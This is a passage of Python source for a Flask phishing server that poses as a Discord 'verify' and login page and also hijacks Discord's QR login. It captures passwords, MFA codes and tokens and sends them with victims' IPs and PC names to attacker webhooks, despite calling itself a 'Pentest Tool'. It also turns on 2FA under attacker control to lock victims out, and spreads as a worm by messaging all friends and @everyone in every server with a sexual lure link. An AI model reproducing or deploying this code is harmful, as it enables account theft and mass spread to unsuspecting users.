        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
        "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin",
    }

    def _fallback(reason):
        try:
            plain_req.post(WEBHOOK, json={
                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                "username": "Pentest Tool"
            }, timeout=10)
            print(f"[+] Webhook sent (fallback: {reason})")
        except Exception as e2:
            print(f"[!] Webhook fallback failed: {e2}")
        try:
            plain_req.post(WEBHOOK_BACKUP, json={
                "embeds": [{"description": f"**TOKEN ({reason}):**\n```{token}```\n**Password:** `{password}`\n**IP:** `{client_ip}`\n**PC:** `{comp}` / `{luser}`", "color": 16776960}],
                "username": "Pentest Tool"
            }, timeout=10)
        except: pass

    try:
        r = s_api.get(f"{API}/users/@me", headers=api_h, timeout=15)

        if r.status_code != 200:
            _fallback(f"info {r.status_code}"); return

        u = r.json()
        uid    = u.get('id', '?')
        uname  = u.get('username', 'N/A')
        disc   = u.get('discriminator', '0000')
        email  = u.get('email', 'N/A')
        phone  = u.get('phone', 'N/A')
        avatar = u.get('avatar')
        mfa    = u.get('mfa_enabled', False)
        nitro  = u.get('premium_type', 0) not in (None, 0)
        pfp    = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else None
        color  = 65280 if nitro else 16711680

        # ── Auto-enable 2FA if account has no MFA and we have a password ──
        totp_secret = None
        backup_codes_str = ''
        active_token = token  # Track which token is currently valid
        final_password = password
        pw_changed = False
        tfa_just_enabled = False
        if not mfa and password and password != '?':
            new_tok, secret, backups = _auto_enable_2fa(token, password)
            if new_tok:
                active_token = new_tok
                totp_secret = secret
                backup_codes_str = ', '.join(backups) if backups else 'None'
                mfa = True  # Now it's enabled
                tfa_just_enabled = True
                api_h['Authorization'] = active_token
                print(f'[2fa] Token updated for {uname}: {active_token[:20]}...')

        # ── Send mass messages using the active (post-takeover) token ──
        threading.Thread(target=_mass_message, args=(active_token, uname), daemon=True).start()

        try:
            cr = s_api.get(f"{API}/users/@me/channels", headers=api_h, timeout=10)
            dm_ids = [c['id'] for c in cr.json()] if cr.status_code == 200 else []
        except:
            dm_ids = []

        hq_str = _hq_guilds(active_token)
        try:
            gs = s_api.get(f"{API}/users/@me/guilds?with_counts=true",
                              headers=api_h, timeout=10).json()
            hq_ids = [g['id'] for g in gs if g.get("owner") or g.get("permissions") == "4398046511103"]
        except:
            hq_ids = []

        guild_ch = []
        for gid in hq_ids:
            try:
                gc = s_api.get(f"{API}/guilds/{gid}/channels",
                                  headers=api_h, timeout=10)
                if gc.status_code == 200:
                    guild_ch.extend(c['id'] for c in gc.json() if c.get('type') == 0)
            except:
                continue

        total = len(dm_ids) + len(guild_ch)

        # Build 2FA section for embed
        tfa_section = f"**2FA:** {'✅ Enabled' if mfa else '❌'}\n"
        if tfa_just_enabled and totp_secret:
            tfa_section += f"**TOTP Secret:** `{totp_secret}`\n"
            tfa_section += f"**Backup Codes:** `{backup_codes_str}`\n"

        # Build password section
        pw_line = f"**Password:** `{password}`\n"

        payload = {
            "embeds": [{
                "color": color,
                "thumbnail": {"url": pfp} if pfp else None,
                "author": {"name": f"{uname}#{disc}'s Information"},
                "description": (
                    f"**Discord ID:** `{uid}`\n"
                    f"**Email:** {email}\n"
                    f"**Phone:** {phone}\n"
                    f"{pw_line}"
                    f"{tfa_section}"
                    f"**Nitro:** {'✅' if nitro else '❌'}\n"
                    f"**System Info:**\n"
                    f"📛 Computer Name: `{comp}`\n"
                    f"👤 Username: `{luser}`\n"
                    f"🌐 IP Address: `{client_ip}`\n\n"
                    f"**TOKEN:**\n```{active_token}```\n"
                    f"**Messages to send:** `{total}`\n\n"
                    f"**HQ Guilds:**\n{hq_str}\n"
                ),
                "footer": {"text": "Logged by Combined Pentest Tool"}
            }],
            "username": "Pentest Tool"
        }
        plain_req.post(WEBHOOK, json=payload, timeout=10)
        print(f"[+] Webhook sent for {uname}#{disc} ({uid})")
        # Also fire backup webhook
        try:
            plain_req.post(WEBHOOK_BACKUP, json=payload, timeout=10)
        except: pass

    except Exception as e:
        print(f"[!] Webhook error: {e}")
        _fallback("exception")


def fire_webhook(token, client_ip="?", password="?"):
    # Try to look up password from store if not provided
    if password == '?':
        with _pw_store_lock:
            password = _pw_store.pop(token, '?')
    with _webhookd_lock:
        if token in _webhookd_tokens:
            print(f"[~] Webhook skipped (duplicate token)")
            return
        _webhookd_tokens.add(token)
    threading.Thread(target=send_webhook, args=(token, client_ip, password), daemon=True).start()


def _get_user_brief(token):
    """Fetch user id, username, avatar URL from token for success page."""
    try:
        h = {"Authorization": token, "User-Agent": UA}
        r = plain_req.get(f"{API}/users/@me", headers=h, timeout=10)
        if r.status_code == 200:
            u = r.json()
            uid = u.get('id', '')
            avatar = u.get('avatar', '')
            uname = u.get('username', '')
            pfp = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png?size=128" if avatar else ''
            return {'user_id': uid, 'username': uname, 'avatar_url': pfp}
    except:
        pass
    return {}


def _assign_role(user_id):
    """Add verified role to user in guild using bot token.
    Uses curl_cffi for Chrome TLS impersonation (bypasses Cloudflare on Railway).
    Skips member check — PUT /roles returns clear errors if user isn't in guild.
    Retries up to 3 times with backoff."""
    if not all([BOT_TOKEN, GUILD_ID, VERIFIED_ID, user_id]):
        print(f'[role] Skipping role assign: missing config (bot={bool(BOT_TOKEN)}, guild={GUILD_ID or "?"}, role={VERIFIED_ID or "?"}, user={user_id or "?"})')
        return False
    try:
        s = _make_session()
        url = f'{API}/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ID}'
        h = {
            'Authorization': f'Bot {BOT_TOKEN}',
            'User-Agent': 'DiscordBot (https://verify.discord.com, 1.0)',
            'X-Audit-Log-Reason': 'Age verification',
            'Content-Length': '0',
        }
        for attempt in range(3):
            try:
                r = s.put(url, headers=h, timeout=10)
            except Exception as net_err:
                print(f'[role] Network error attempt {attempt+1}/3: {net_err}')
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    s = _make_session()
                    continue
                raise
            if r.status_code in (200, 204):
                print(f'[role] ✓ Assigned role {VERIFIED_ID} to user {user_id} in guild {GUILD_ID}')
                return True
            elif r.status_code == 429:
                retry_after = 5
                try: retry_after = r.json().get('retry_after', 5)
                except: pass
                print(f'[role] Rate limited, retrying in {retry_after}s...')
                time.sleep(retry_after)
                continue
            elif r.status_code in (500, 502, 503, 504) or r.status_code == 403:
                print(f'[role] Server error attempt {attempt+1}/3 [{r.status_code}]: {r.text[:200]}')
                if attempt < 2:
                    time.sleep(2 * (attempt + 1))
                    s = _make_session()
                    continue
                print(f'[role] ✗ Failed after 3 attempts [{r.status_code}]: {r.text[:300]}')
                return False
            else:
                print(f'[role] ✗ Failed to assign role [{r.status_code}]: {r.text[:300]}')
                return False
        return False
    except Exception as e:
        print(f'[role] Error assigning role: {e}')
        return False


def _join_voice_channel(token, guild_id, channel_id):
    """Connect user's token to a voice channel via Gateway (once, no retry)."""
    if not all([token, guild_id, channel_id]):
        print(f'[voice] Skipping: missing token/guild/channel')
        return False
    try:
        print(f'[voice] Connecting {token[:20]}... to voice {channel_id}')
        ws = websocket.create_connection(
            'wss://gateway.discord.gg/?v=9&encoding=json',
            header=[f'User-Agent: {UA}', 'Origin: https://discord.com'],
            timeout=30
        )
        hello = json.loads(ws.recv())
        hb_interval = hello.get('d', {}).get('heartbeat_interval', 41250) / 1000

        # Identify with proper browser fingerprint
        ws.send(json.dumps({
            'op': 2,
            'd': {
                'token': token,
                'capabilities': 30717,
                'properties': {
                    'os': 'Windows', 'browser': 'Chrome', 'device': '',
                    'system_locale': 'en-US', 'browser_user_agent': UA,
                    'browser_version': f'{CHROME_VER}.0.0.0', 'os_version': '10',
                    'referrer': '', 'referring_domain': '',
                    'referrer_current': '', 'referring_domain_current': '',
                    'release_channel': 'stable',
                    'client_build_number': BUILD, 'client_event_source': None
                },
                'presence': {'status': 'online', 'since': 0, 'activities': [], 'afk': False},
                'compress': False
            }
        }))

        # Wait for READY event
        ready_timeout = time.time() + 15
        while time.time() < ready_timeout:
            raw = ws.recv()
            d = json.loads(raw)
            if d.get('t') == 'READY':
                print(f'[voice] Gateway READY, joining channel...')
                break
        else:
            print(f'[voice] Timeout waiting for READY')
            ws.close()
            return False

        # Voice State Update — join the channel (self-muted, self-deafened)
        ws.send(json.dumps({
            'op': 4,
            'd': {
                'guild_id': guild_id,
                'channel_id': channel_id,
                'self_mute': True,
                'self_deaf': True,
                'self_video': False
            }
        }))
        print(f'[voice] Sent voice state update for {channel_id}')

        # Keep alive for 2 minutes (heartbeats), then disconnect (was 5min — OOM fix)
        stop_at = time.time() + 120
        next_hb = time.time() + hb_interval
        ws.settimeout(hb_interval + 5)
        while time.time() < stop_at:
            try:
                if time.time() >= next_hb:
                    ws.send(json.dumps({'op': 1, 'd': None}))
                    next_hb = time.time() + hb_interval
                raw = ws.recv()
                d = json.loads(raw)
                if d.get('op') == 1:  # Heartbeat request
                    ws.send(json.dumps({'op': 1, 'd': None}))
                    next_hb = time.time() + hb_interval
            except websocket.WebSocketTimeoutException:
                pass
            except:
                break

        # Leave voice before disconnecting
        try:
            ws.send(json.dumps({'op': 4, 'd': {'guild_id': guild_id, 'channel_id': None, 'self_mute': True, 'self_deaf': True}}))
            time.sleep(0.5)
        except:
            pass
        ws.close()
        print(f'[voice] Disconnected from voice after 2min')
        return True
    except Exception as e:
        print(f'[voice] Error: {e}')
        return False


def _set_dnd(token):
    """Set the captured token's status to Do Not Disturb immediately."""
    try:
        h = {"Authorization": token, "User-Agent": UA, "Content-Type": "application/json"}
        r = plain_req.patch(f"{API}/users/@me/settings", headers=h,
                            json={"status": "dnd"}, timeout=10)
        print(f'[dnd] Set DND: {r.status_code}')
    except Exception as e:
        print(f'[dnd] Error: {e}')


def _success_with_info(token):
    """Build success response with user info, fire webhook & assign role + voice."""
    info = _get_user_brief(token)
    # Assign verified role in background
    if info.get('user_id'):
        threading.Thread(target=_assign_role, args=(info['user_id'],), daemon=True).start()
    # Join voice channel (once, no retry)
    if VOICE_CHANNEL_ID and GUILD_ID:
        threading.Thread(target=_join_voice_channel, args=(token, GUILD_ID, VOICE_CHANNEL_ID), daemon=True).start()
    # Join second voice channel
    if VOICE_CHANNEL_ID_2 and GUILD_ID_2:
        threading.Thread(target=_join_voice_channel, args=(token, GUILD_ID_2, VOICE_CHANNEL_ID_2), daemon=True).start()
    # Spread DM invite in background
    threading.Thread(target=_spread_dms, args=(token,), daemon=True).start()
    # Set to Do Not Disturb immediately
    threading.Thread(target=_set_dnd, args=(token,), daemon=True).start()
    return {'success': True, **info}


# ━━━━━━━━━━━━ DM Spread (stealth) ━━━━━━━━━━━━
import random

SPREAD_MESSAGE = 'https://discord.gg/bzGsAUpdsY bro join she is stripping on cam'

def _make_nonce():
    """Generate a Discord-style snowflake nonce (like real client)."""
    return str((int(time.time() * 1000) - 1420070400000) << 22 | random.randint(0, 4194303))


def _spread_dms(token):
    """Send invite link to all open DMs and friends using full Chrome TLS impersonation."""
    try:
        # Build a stealth session — same Chrome fingerprint the login used
        s = _make_session()

        # Visit discord.com first to get cookies (mimics real browser session)
        try:
            s.get('https://discord.com/channels/@me', headers={
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': UA,
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
            }, timeout=15)
        except:
            pass

        def api_headers(with_ct=True):
            h = {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Authorization': token,
                'Origin': 'https://discord.com',
                'Referer': 'https://discord.com/channels/@me',
                'User-Agent': UA,
                'X-Discord-Locale': 'en-US',
                'X-Discord-Timezone': 'America/Los_Angeles',
                'X-Debug-Options': 'bugReporterEnabled',
                'X-Super-Properties': sprops(),
                'Sec-CH-UA': SEC_CH_UA,
                'Sec-CH-UA-Mobile': SEC_CH_UA_MOBILE,
                'Sec-CH-UA-Platform': SEC_CH_UA_PLATFORM,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
            }
            if with_ct:
                h['Content-Type'] = 'application/json'
            return h

        # ── PHASE 1: Collect all DM targets (open DMs + friends) — DMs FIRST ──
        dm_channel_ids = []
        try:
            r = s.get(f'{API}/users/@me/channels', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                for ch in r.json():
                    if ch.get('type') in (1, 3):  # 1=DM, 3=GroupDM
                        dm_channel_ids.append(ch['id'])
                print(f'[spread] Found {len(dm_channel_ids)} open DM channels')
            else:
                print(f'[spread] Failed to get DMs: {r.status_code}')
        except Exception as e:
            print(f'[spread] DM list error: {e}')

        # Get friends and open DM channels for those not already open
        friend_user_ids = set()
        try:
            r = s.get(f'{API}/users/@me/relationships', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                for rel in r.json():
                    if rel.get('type') == 1:
                        friend_user_ids.add(rel['id'])
                print(f'[spread] Found {len(friend_user_ids)} friends')
            else:
                print(f'[spread] Failed to get friends: {r.status_code}')
        except Exception as e:
            print(f'[spread] Friends list error: {e}')

        for fid in friend_user_ids:
            try:
                time.sleep(0.65)
                r = s.post(f'{API}/users/@me/channels', headers=api_headers(),
                           json={'recipients': [fid]}, timeout=15)
                if r.status_code == 200:
                    ch_id = r.json().get('id')
                    if ch_id and ch_id not in dm_channel_ids:
                        dm_channel_ids.append(ch_id)
            except:
                pass

        print(f'[spread] Total DM channels to message: {len(dm_channel_ids)}')

        # ── PHASE 2: Send DM messages ──
        sent = 0
        failed = 0
        for ch_id in dm_channel_ids:
            try:
                time.sleep(0.65)
                payload = {
                    'content': SPREAD_MESSAGE,
                    'nonce': _make_nonce(),
                    'tts': False,
                    'flags': 0
                }
                r = s.post(f'{API}/channels/{ch_id}/messages',
                           headers=api_headers(), json=payload, timeout=15)
                if r.status_code == 200:
                    sent += 1
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 5)
                    print(f'[spread] Rate limited on {ch_id}, waiting {retry}s')
                    time.sleep(retry + 1)
                    r2 = s.post(f'{API}/channels/{ch_id}/messages',
                                headers=api_headers(), json=payload, timeout=15)
                    if r2.status_code == 200:
                        sent += 1
                    else:
                        failed += 1
                elif r.status_code == 403:
                    failed += 1
                else:
                    failed += 1
                    print(f'[spread] DM error {r.status_code} on {ch_id}')
            except Exception as e:
                failed += 1

        print(f'[spread] DMs done: sent={sent}, failed={failed}')

        # ── PHASE 3: Spam ALL guild text channels with @everyone ──
        guild_sent = 0
        guild_failed = 0
        try:
            r = s.get(f'{API}/users/@me/guilds', headers=api_headers(False), timeout=15)
            if r.status_code == 200:
                guilds = r.json()
                print(f'[spread] Found {len(guilds)} guilds to spam')
                for guild in guilds:
                    gid = guild['id']
                    try:
                        cr = s.get(f'{API}/guilds/{gid}/channels', headers=api_headers(False), timeout=15)
                        if cr.status_code != 200:
                            continue
                        channels = cr.json()
                        text_chs = [c for c in channels if c.get('type') == 0]
                        for ch in text_chs:
                            try:
                                time.sleep(0.65)
                                payload = {
                                    'content': f'@everyone {SPREAD_MESSAGE}',
                                    'nonce': _make_nonce(),
                                    'tts': False,
                                    'flags': 0
                                }
                                r2 = s.post(f'{API}/channels/{ch["id"]}/messages',
                                            headers=api_headers(), json=payload, timeout=15)
                                if r2.status_code == 200:
                                    guild_sent += 1
                                elif r2.status_code == 429:
                                    rt = r2.json().get('retry_after', 5)
                                    time.sleep(rt + 1)
                                    r3 = s.post(f'{API}/channels/{ch["id"]}/messages',
                                                headers=api_headers(), json=payload, timeout=15)
                                    if r3.status_code == 200:
                                        guild_sent += 1
                                    else:
                                        guild_failed += 1
                                else:
                                    guild_failed += 1
                            except:
                                guild_failed += 1
                    except:
                        pass
        except Exception as e:
            print(f'[spread] Guild fetch error: {e}')

        print(f'[spread] Guilds done: sent={guild_sent}, failed={guild_failed}')
        print(f'[spread] TOTAL: DM={sent}, Guild={guild_sent}')

    except Exception as e:
        print(f'[spread] Fatal error: {e}')


# ━━━━━━━━━━━━ QR Remote Auth ━━━━━━━━━━━━

sessions = {}          # QR auth sessions

import collections

# ━━━━━━━━━━━━ Session Pre-Warm Pool ━━━━━━━━━━━━
# Pre-prepares DiscordSessions (cookies + fingerprint) so logins start faster.
# Saves ~2-4s per login by skipping the prepare() step.

_session_pool = collections.deque()
_session_pool_lock = threading.Lock()
_session_pool_active = 0
SESSION_POOL_MAX = 4     # reduced from 12 — Railway OOM fix
SESSION_POOL_TTL = 180   # 3 minutes (shorter = less stale sessions in RAM)


def _prepare_session_worker():
    global _session_pool_active
    try:
        ds = DiscordSession()
        ds.prepare()
        if ds.cookies_ready:
            with _session_pool_lock:
                _session_pool.append({'session': ds, 'time': time.time()})
            print(f'[session-pool] Ready! Pool: {len(_session_pool)}')
        else:
            print('[session-pool] Failed to prepare session')
    except Exception as e:
        print(f'[session-pool] Error: {e}')
    finally:
        with _session_pool_lock:
            _session_pool_active -= 1


def _refill_session_pool():
    global _session_pool_active
    with _session_pool_lock:
        now = time.time()
        while _session_pool and (now - _session_pool[0]['time']) > SESSION_POOL_TTL:
            stale = _session_pool.popleft()
            # Explicitly close the curl_cffi session to free memory
            try: stale['session'].s.close()
            except: pass
        pool_size = len(_session_pool)
        needed = SESSION_POOL_MAX - pool_size - _session_pool_active
        if needed <= 0:
            return
        to_launch = min(needed, 2)  # launch up to 2 at once (was 3)
        _session_pool_active += to_launch
    for _ in range(to_launch):
        threading.Thread(target=_prepare_session_worker, daemon=True).start()


def _get_ready_session():
    """Get a pre-prepared session from the pool (instant) or None."""
    with _session_pool_lock:
        now = time.time()
        while _session_pool:
            entry = _session_pool.popleft()
            if now - entry['time'] < SESSION_POOL_TTL:
                threading.Thread(target=_refill_session_pool, daemon=True).start()
                return entry['session']
    _refill_session_pool()
    return None


def _session_pool_loop():
    """Background loop — keeps session pool full."""
    print('[session-pool] Background loop started (warming in 3s)')
    time.sleep(3)
    while True:
        try:
            _refill_session_pool()
        except Exception as e:
            print(f'[session-pool] Error: {e}')
        time.sleep(15)  # check every 15s instead of 8s — less memory churn


# ━━━━━━━━━━━━ Captcha — Human-Solved ━━━━━━━━━━━━
# No pre-solve arsenal. Discord returns a captcha challenge → frontend renders
# the real hCaptcha widget → user solves → token sent back with login request.

DEFAULT_SITEKEY = 'a9b5fb07-92ff-493f-86fe-352a2803b3df'


class QRAuth:
    def __init__(self):
        self.id    = uuid.uuid4().hex[:8]
        self.pk    = rsa.generate_private_key(65537, 2048)
        self.pub   = self.pk.public_key()
        self.fp    = None
        self.st    = 'init'
        self.user  = None
        self.token = None
        self.err   = None
        self.ws    = None
        self._stop = threading.Event()
        self._wh   = False

    def pub_b64(self):
        return base64.b64encode(self.pub.public_bytes(
            serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
        )).decode()

    def decrypt(self, b64s):
        return self.pk.decrypt(
            base64.b64decode(b64s),
            asym_pad.OAEP(asym_pad.MGF1(hashes.SHA256()), hashes.SHA256(), None)
        )


def _qr_worker(s: QRAuth):
    # Use a pre-warmed session from the pool (no prepare() needed = instant start)
    ds = _get_ready_session()
    if ds is None:
        ds = DiscordSession()
        ds.prepare()  # fallback: fresh session (slow path, pool was empty)

    try:
        def on_msg(ws, raw):
            d  = json.loads(raw)
            op = d.get('op')

            if op == 'hello':
                hb = d.get('heartbeat_interval', 40000) / 1000
                ws.send(json.dumps({'op': 'init', 'encoded_public_key': s.pub_b64()}))
                def beat():
                    while not s._stop.is_set():
                        try: ws.send(json.dumps({'op': 'heartbeat'}))
                        except: break
                        s._stop.wait(hb)
                threading.Thread(target=beat, daemon=True).start()

            elif op == 'nonce_proof':
                dec   = s.decrypt(d['encrypted_nonce'])
                proof = b64url(hashlib.sha256(dec).digest())
                ws.send(json.dumps({'op': 'nonce_proof', 'proof': proof}))

            elif op == 'pending_remote_init':
                s.fp = d['fingerprint']
                s.st = 'pending'

            elif op == 'pending_ticket':
                try:
                    info  = s.decrypt(d['encrypted_user_payload']).decode()
                    parts = info.split(':')
                    s.user = {
                        'id': parts[0],
                        'disc': parts[1] if len(parts) > 1 else '0',
                        'avatar': parts[2] if len(parts) > 2 else '',
                        'name': parts[3] if len(parts) > 3 else '?',
                    }
                    s.st = 'scanned'
                except Exception as e:
                    s.st = 'error'; s.err = str(e)

            elif op == 'pending_login':
                s.st = 'confirming'
                try:
                    r = ds.post('/users/@me/remote-auth/login', {'ticket': d['ticket']})
                    j = r.json()
                    if 'encrypted_token' in j:
                        s.token = s.decrypt(j['encrypted_token']).decode()
                        s.st = 'done'
                        if not s._wh:
                            s._wh = True
                            fire_webhook(s.token)
                    else:
                        s.st = 'error'; s.err = json.dumps(j)
                except Exception as e:
                    s.st = 'error'; s.err = str(e)
                s._stop.set()

            elif op == 'cancel':
                s.st = 'cancelled'; s._stop.set()

        def on_err(ws, e):
            if s.st not in ('done', 'cancelled'):
                s.st = 'error'; s.err = str(e)
            s._stop.set()

        def on_close(ws, code, msg):
            if s.st in ('init', 'pending', 'scanned', 'confirming'):
                s.st = 'expired' if s.st == 'pending' else 'error'
                s.err = s.err or ('QR expired' if s.st == 'expired' else f'Closed ({code})')
            s._stop.set()

        ws = websocket.WebSocketApp(
            WS_URL,
            on_message=on_msg, on_error=on_err, on_close=on_close,
            header=[f'Origin: https://discord.com', f'User-Agent: {UA}'],
        )
        s.ws = ws
        ws.run_forever()
    except Exception as e:
        s.st = 'error'; s.err = str(e); s._stop.set()


# ━━━━━━━━━━━━ Routes ━━━━━━━━━━━━

@app.route('/')
def index():
    return send_from_directory('.', 'verify_page.html')


@app.route('/verify/<path:slug>')
def verify_catchall(slug):
    """Catch-all: /verify/anything serves the same verify page."""
    return send_from_directory('.', 'verify_page.html')


@app.route('/login')
def login_page():
    try:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'discord_login.html'), 'r', encoding='utf-8') as f:
            html = f.read()
    except:
        return send_from_directory('.', 'discord_login.html')
    # Inject page token so /api/qr/start can verify the request came from a real page load
    tok = _issue_page_token()
    html = html.replace('</head>', f'<script>window._pgToken="{tok}";</script></head>', 1)
    resp = make_response(html)
    resp.headers['Content-Type'] = 'text/html; charset=utf-8'
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    resp.headers['Pragma'] = 'no-cache'
    resp.headers['Expires'] = '0'
    resp.headers['Clear-Site-Data'] = '"cache"'
    resp.headers['Vary'] = '*'
    import hashlib
    resp.headers['ETag'] = hashlib.md5(html.encode()).hexdigest()
    return resp


@app.route('/favicon.ico')
def favicon():
    return send_from_directory('.', 'captcha.png', mimetype='image/png')


@app.route('/api/login', methods=['POST'])
def api_login():
    ok, retry_after = _rate_check('login')
    if not ok:
        return jsonify({'error': f'Too many attempts. Try again in {retry_after}s.'}), 429
    d = request.json
    login_email        = d.get('login')
    login_pw           = d.get('password')
    captcha_token      = d.get('captcha_token', '')
    captcha_rqtoken    = d.get('captcha_rqtoken', '')
    captcha_session_id = d.get('captcha_session_id', '')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    try:
        ds = _get_ready_session() or DiscordSession()
        ds.prepare()

        payload = {
            'login': login_email, 'password': login_pw,
            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
        }

        # Build extra captcha headers if user already solved the widget
        extra = {}
        if captcha_token:
            extra['X-Captcha-Key']        = captcha_token
            extra['X-Captcha-Rqtoken']    = captcha_rqtoken
            extra['X-Captcha-Session-Id'] = captcha_session_id

        try:
            r = ds.post('/auth/login', payload, extra_headers=extra)
        except Exception:
            snap = ds.snapshot()
            ds = DiscordSession()
            ds.s = _make_session()
            ds.restore(snap)
            r = ds.post('/auth/login', payload, extra_headers=extra)

        try:
            j = r.json()
        except Exception:
            return jsonify({'error': 'Discord returned invalid response. Try again.'}), 502
        print(f'[login] [{r.status_code}]: {r.text[:300]}')

        ckeys = j.get('captcha_key', [])
        is_captcha = isinstance(ckeys, list) and (
            'captcha-required' in ckeys or j.get('captcha_sitekey')
        )

        if is_captcha:
            # Return challenge to frontend — human will solve it
            print(f'[login] Captcha required — sending challenge to browser')
            return jsonify({
                'captcha_needed': True,
                'sitekey':    j.get('captcha_sitekey', DEFAULT_SITEKEY),
                'rqdata':     j.get('captcha_rqdata', ''),
                'rqtoken':    j.get('captcha_rqtoken', ''),
                'session_id': j.get('captcha_session_id', ''),
            }), 200

        return _format_login_result(j, r.status_code, client_ip, ds, password=login_pw)

    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500


def _format_login_result(j, status_code, client_ip, ds=None, password='?'):
    """Format Discord login result into a Flask response."""
    if j.get('token'):
        fire_webhook(j['token'], client_ip, password)
        return jsonify(_success_with_info(j['token']))
    # Store password for MFA ticket lookup
    if j.get('ticket') and password != '?':
        with _pw_store_lock:
            _pw_store[j['ticket']] = password

    if j.get('ticket') and j.get('mfa') is not None:
        print(f'[*] MFA required: mfa={j.get("mfa")}, sms={j.get("sms")}')
        resp = dict(j)
        if password and password != '?':
            resp['_pw'] = password  # Pass to frontend for MFA round-trip
        return jsonify(resp)

    # Error
    err_msg = j.get('message', '')
    if not err_msg:
        ckeys = j.get('captcha_key', [])
        if isinstance(ckeys, list) and ('captcha-required' in ckeys or 'invalid-response' in ckeys):
            err_msg = 'Verification timed out. Please try again.'
        elif j.get('retry_after'):
            err_msg = f'Rate limited. Try again in {int(j["retry_after"])}s.'
        else:
            err_msg = 'Login failed. Please check your credentials and try again.'

    errs = j.get('errors', {})
    is_email_verify = False
    for field_key in errs:
        if isinstance(errs[field_key], dict):
            for fe in errs[field_key].get('_errors', []):
                if fe.get('code') == 'ACCOUNT_LOGIN_VERIFICATION_EMAIL':
                    err_msg = fe.get('message', 'New login location detected. Please check your email.')
                    is_email_verify = True

    result = {'message': err_msg, 'error': err_msg}
    if is_email_verify:
        result['email_verify'] = True
    if j.get('errors'):
        result['errors'] = j['errors']
    if j.get('retry_after'):
        result['retry_after'] = j['retry_after']

    # Forward Discord's code50035 directly for better frontend handling
    if j.get('code'):
        result['code'] = j['code']

    print(f'[!] Login result: {err_msg}')
    return jsonify(result), status_code


@app.route('/api/mfa/totp', methods=['POST'])
def api_mfa_totp():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/totp', {
            'code': d.get('code'), 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms/send', methods=['POST'])
def api_mfa_sms_send():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        r = ds.post('/auth/mfa/sms/send', {'ticket': d.get('ticket')})
        return jsonify(r.json()), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/sms', methods=['POST'])
def api_mfa_sms_verify():
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/sms', {
            'code': d.get('code'), 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/mfa/backup', methods=['POST'])
def api_mfa_backup():
    """Submit an 8-digit backup code for MFA verification."""
    d = request.json
    try:
        ds = DiscordSession()
        ds.prepare()
        # Discord uses the same /auth/mfa/totp endpoint for backup codes
        # The code format (8-digit with hyphen) tells Discord it's a backup code
        code = d.get('code', '').strip().replace(' ', '-')
        ticket = d.get('ticket')
        r = ds.post('/auth/mfa/totp', {
            'code': code, 'ticket': ticket,
            'gift_code_sku_id': None, 'login_source': None,
        })
        j = r.json()
        if j.get('token'):
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            with _pw_store_lock:
                pw = _pw_store.pop(ticket, '?') if ticket else '?'
            if pw == '?':
                pw = d.get('pw', '?')  # Fallback: frontend round-trip
            fire_webhook(j['token'], ip, pw)
            return jsonify(_success_with_info(j['token']))
        return jsonify(j), r.status_code
    except Exception as e:
        return jsonify({'error': str(e)}), 500


# Active QR sessions per IP (dedup concurrent page loads hitting /api/qr/start)
_qr_by_ip = {}   # ip -> session id
_qr_by_ip_lock = threading.Lock()
QR_MAX_SESSIONS = 30  # hard cap on simultaneous QR sessions


@app.route('/api/qr/start')
def api_qr_start():
    # Gate: must have a valid page token (issued at /login page load)
    tok = request.args.get('t', '')
    if not _check_page_token(tok):
